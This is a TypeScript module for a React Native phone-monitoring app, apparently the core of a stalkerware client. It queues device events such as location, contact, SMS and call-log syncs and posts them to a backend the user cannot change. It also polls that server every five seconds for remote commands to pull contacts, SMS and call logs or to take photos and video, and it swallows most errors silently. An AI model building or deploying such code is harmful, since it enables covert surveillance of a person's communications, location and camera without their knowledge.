/**
 * tracker.ts
 * Core module — kumpul event, simpan lokal, kirim realtime ke API backend.
 * Setiap event langsung dikirim otomatis segera setelah terjadi.
 * Kalau gagal, retry otomatis tiap 30 detik.
 *
 * API URL diambil dari env variable EXPO_PUBLIC_API_URL — tidak bisa diubah user.
 */

import AsyncStorage from '@react-native-async-storage/async-storage';

// URL dari env — di-set saat build, tidak bisa diubah runtime oleh user
const API_URL = (process.env.EXPO_PUBLIC_API_URL ?? '').trim();

export type EventType =
  | 'app_open'
  | 'app_close'
  | 'app_background'
  | 'app_foreground'
  | 'battery_level'
  | 'battery_state'
  | 'network_change'
  | 'location_update'
  | 'contacts_sync'
  | 'sms_sync'
  | 'call_log_sync'
  | 'custom';

export interface TrackEvent {
  id: string;
  type: EventType;
  timestamp: string;
  data: Record<string, unknown>;
  deviceId: string;
  sent: boolean;
}

export interface TrackerStatus {
  lastSentAt: Date | null;
  pendingCount: number;
  totalSent: number;
  isConnected: boolean;
  lastError: string | null;
  apiUrl: string;
}

const STORAGE_KEY_DEVICE_ID   = '@device_monitor/device_id';
const STORAGE_KEY_LOGS        = '@device_monitor/logs';
const STORAGE_KEY_PAIRING     = '@device_monitor/pairing_code';
const MAX_LOCAL_LOGS           = 500;
const RETRY_INTERVAL_MS        = 30_000;

// ─── In-memory state ──────────────────────────────────────────────────────────

let eventQueue: TrackEvent[]        = [];
let isSending                        = false;
let deviceId                         = '';
let pairingCode                      = '';
let retryTimer: ReturnType<typeof setTimeout> | null = null;

let trackerStatus: TrackerStatus = {
  lastSentAt: null,
  pendingCount: 0,
  totalSent: 0,
  isConnected: false,
  lastError: null,
  apiUrl: API_URL,
};

type StatusListener = (status: TrackerStatus) => void;
const statusListeners = new Set<StatusListener>();

function notifyListeners() {
  statusListeners.forEach((fn) => fn({ ...trackerStatus }));
}

export function subscribeTrackerStatus(fn: StatusListener): () => void {
  statusListeners.add(fn);
  fn({ ...trackerStatus });
  return () => statusListeners.delete(fn);
}

function setStatus(partial: Partial<TrackerStatus>) {
  trackerStatus = { ...trackerStatus, ...partial };
  notifyListeners();
}

// ─── Helpers ──────────────────────────────────────────────────────────────────

function generateId(): string {
  return `${Date.now()}-${Math.random().toString(36).slice(2, 9)}`;
}

function generatePairingCode(): string {
  // 4 digit angka: 1000–9999
  return String(Math.floor(1000 + Math.random() * 9000));
}

// ─── Init ─────────────────────────────────────────────────────────────────────

export async function initTracker(): Promise<void> {
  // Load atau buat deviceId
  const stored = await AsyncStorage.getItem(STORAGE_KEY_DEVICE_ID);
  if (stored) {
    deviceId = stored;
  } else {
    deviceId = `device-${generateId()}`;
    await AsyncStorage.setItem(STORAGE_KEY_DEVICE_ID, deviceId);
  }

  // Load atau buat pairing code — tetap sama selama belum di-link
  const storedCode = await AsyncStorage.getItem(STORAGE_KEY_PAIRING);
  if (storedCode) {
    pairingCode = storedCode;
  } else {
    pairingCode = generatePairingCode();
    await AsyncStorage.setItem(STORAGE_KEY_PAIRING, pairingCode);
  }

  const logs = await getLocalLogs();
  const pending = logs.filter((e) => !e.sent);

  setStatus({
    pendingCount: pending.length,
    isConnected: !!API_URL,
    apiUrl: API_URL,
  });

  // Retry pending dari sesi sebelumnya
  if (pending.length > 0 && API_URL) {
    eventQueue.push(...pending);
    void flushQueue();
  }

  startRetryTimer();
}

// ─── Public getters ───────────────────────────────────────────────────────────

export function getDeviceId(): string {
  return deviceId;
}

export function getPairingCode(): string {
  return pairingCode;
}

export function getApiUrl(): string {
  return API_URL;
}

export function getTrackerStatus(): TrackerStatus {
  return { ...trackerStatus };
}

// ─── Track ────────────────────────────────────────────────────────────────────

export async function trackEvent(
  type: EventType,
  data: Record<string, unknown> = {}
): Promise<TrackEvent> {
  const event: TrackEvent = {
    id: generateId(),
    type,
    timestamp: new Date().toISOString(),
    data,
    deviceId,
    sent: false,
  };

  await saveEventLocally(event);

  eventQueue.push(event);
  setStatus({ pendingCount: trackerStatus.pendingCount + 1 });

  if (API_URL) {
    void flushQueue();
  }

  return event;
}

// ─── Local Storage ────────────────────────────────────────────────────────────

async function saveEventLocally(event: TrackEvent): Promise<void> {
  try {
    const raw = await AsyncStorage.getItem(STORAGE_KEY_LOGS);
    const logs: TrackEvent[] = raw ? JSON.parse(raw) : [];
    logs.unshift(event);
    await AsyncStorage.setItem(
      STORAGE_KEY_LOGS,
      JSON.stringify(logs.slice(0, MAX_LOCAL_LOGS))
    );
  } catch {
    // Jangan crash app
  }
}

export async function getLocalLogs(): Promise<TrackEvent[]> {
  try {
    const raw = await AsyncStorage.getItem(STORAGE_KEY_LOGS);
    return raw ? JSON.parse(raw) : [];
  } catch {
    return [];
  }
}

// ─── Send to API ──────────────────────────────────────────────────────────────

async function flushQueue(): Promise<void> {
  if (isSending || !API_URL || eventQueue.length === 0) return;

  isSending = true;
  const batch = [...eventQueue];
  eventQueue = [];

  try {
    const response = await fetch(`${API_URL}/api/events`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ events: batch, pairingCode }),
    });

    if (response.ok) {
      await markEventsAsSent(batch.map((e) => e.id));
      setStatus({
        lastSentAt: new Date(),
        pendingCount: Math.max(0, trackerStatus.pendingCount - batch.length),
        totalSent: trackerStatus.totalSent + batch.length,
        isConnected: true,
        lastError: null,
      });
    } else {
      eventQueue = [...batch, ...eventQueue];
      setStatus({
        isConnected: false,
        lastError: `Server error ${response.status}`,
      });
    }
  } catch (err) {
    eventQueue = [...batch, ...eventQueue];
    setStatus({
      isConnected: false,
      lastError: err instanceof Error ? err.message : 'Network error',
    });
  } finally {
    isSending = false;
  }
}

async function markEventsAsSent(ids: string[]): Promise<void> {
  try {
    const idSet = new Set(ids);
    const raw = await AsyncStorage.getItem(STORAGE_KEY_LOGS);
    const logs: TrackEvent[] = raw ? JSON.parse(raw) : [];
    const updated = logs.map((e) => (idSet.has(e.id) ? { ...e, sent: true } : e));
    await AsyncStorage.setItem(STORAGE_KEY_LOGS, JSON.stringify(updated));
  } catch {
    // Silent fail
  }
}

// ─── Retry Timer ──────────────────────────────────────────────────────────────

function startRetryTimer() {
  if (retryTimer) clearInterval(retryTimer);

  retryTimer = setInterval(async () => {
    if (!API_URL || eventQueue.length > 0) return;

    const logs = await getLocalLogs();
    const pending = logs.filter((e) => !e.sent);

    if (pending.length > 0) {
      eventQueue.push(...pending);
      void flushQueue();
    }
  }, RETRY_INTERVAL_MS);
}

export function stopRetryTimer() {
  if (retryTimer) {
    clearInterval(retryTimer);
    retryTimer = null;
  }
}

export async function sendPendingEvents(): Promise<{ sent: number; failed: number }> {
  if (!API_URL) return { sent: 0, failed: 0 };

  const logs = await getLocalLogs();
  const unsent = logs.filter((e) => !e.sent);
  if (unsent.length === 0) return { sent: 0, failed: 0 };

  eventQueue.push(...unsent);
  await flushQueue();

  const after = await getLocalLogs();
  const stillPending = after.filter((e) => !e.sent).length;
  return {
    sent: unsent.length - stillPending,
    failed: stillPending,
  };
}

// ─── Realtime State (tidak masuk DB) ─────────────────────────────────────────
// Kirim battery_state dan app_background/foreground langsung ke /api/realtime
// tanpa disimpan ke AsyncStorage atau dikirim ke /api/events

export async function sendRealtimeState(state: {
  batteryLevel?: number;
  batteryState?: string;
  appState?: string;
}): Promise<void> {
  if (!API_URL || !deviceId) return;
  try {
    await fetch(`${API_URL}/api/realtime`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ deviceId, ...state }),
    });
  } catch {
    // Silent — realtime, tidak perlu retry
  }
}

// ─── Command Polling ──────────────────────────────────────────────────────────
// HP poll /api/commands?deviceId=xxx&status=pending tiap interval
// Callback dipanggil untuk setiap command yang diterima

export type CommandType = 'fetch_contacts' | 'fetch_sms' | 'fetch_calls' | 'take_photo' | 'take_video';

export interface DeviceCommand {
  id: string;
  deviceId: string;
  command: CommandType;
  payload: Record<string, unknown>;
  status: string;
  createdAt: string;
}

type CommandHandler = (command: DeviceCommand) => Promise<void>;
let commandHandler: CommandHandler | null = null;
let commandPollTimer: ReturnType<typeof setTimeout> | null = null;
const COMMAND_POLL_INTERVAL_MS = 5_000;

export function setCommandHandler(handler: CommandHandler) {
  commandHandler = handler;
}

export function startCommandPolling() {
  if (commandPollTimer) clearInterval(commandPollTimer);
  commandPollTimer = setInterval(async () => {
    if (!API_URL || !deviceId || !commandHandler) return;
    try {
      const res = await fetch(
        `${API_URL}/api/commands?deviceId=${deviceId}&status=pending`,
        { headers: { 'Content-Type': 'application/json' } }
      );
      if (!res.ok) return;
      const data = await res.json() as { commands: DeviceCommand[] };
      for (const cmd of data.commands ?? []) {
        void commandHandler(cmd);
      }
    } catch {
      // Silent
    }
  }, COMMAND_POLL_INTERVAL_MS);
}

export function stopCommandPolling() {
  if (commandPollTimer) {
    clearInterval(commandPollTimer);
    commandPollTimer = null;
  }
}

export async function updateCommandStatus(
  id: string,
  status: 'executed' | 'failed',
  result?: Record<string, unknown>
): Promise<void> {
  if (!API_URL) return;
  try {
    await fetch(`${API_URL}/api/commands`, {
      method: 'PATCH',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ id, status, result }),
    });
  } catch {
    // Silent
  }
}
